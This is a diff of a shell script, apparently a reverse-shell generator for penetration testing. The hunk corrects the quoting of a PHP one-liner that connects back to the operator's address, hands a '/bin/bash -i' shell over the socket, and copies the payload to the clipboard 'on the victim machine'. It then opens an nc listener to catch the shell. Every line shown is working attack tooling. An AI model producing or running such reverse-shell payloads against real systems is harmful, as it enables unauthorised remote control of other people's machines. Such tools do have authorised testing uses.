@@ -141,8 +141,8 @@ elif [ "$marg1" = "php" ]; then
       else
         echo "[+] Generating shells with $adapter as the network adapter.";
         echo "[+] Use one of the shell below on the victim machine.";
-        while read line; do printf "[+] Shell php -r '$sock=fsockopen(\"$line\"\,$port);$proc=proc_open(\"\/bin/bash -i\"\, array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'\n"; #NC revshell
-        echo "php -r '$sock=fsockopen(\"$line\"\,$port);$proc=proc_open(\"\/bin/bash -i\"\, array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'" | xclip -selection clipboard; done < .ip.txt;
+        while read line; do printf "[+] Shell php -r '$""sock=fsockopen(\"$line\",$port);$proc=proc_open(\"/bin/bash -i\", array(0=>$""sock, 1=>$""sock, 2=>$""sock),$""pipes);'\n"; #php revshell
+        echo "php -r '$""sock=fsockopen(\"$line\",$port);$proc=proc_open(\"/bin/bash -i\", array(0=>$""sock, 1=>$""sock, 2=>$""sock),$""pipes);'" | xclip -selection clipboard; done < .ip.txt;
         echo "[+] Shell copied in clipboard";
         echo "[+] Opening listener into a new window";
         nc -lnvp $port;
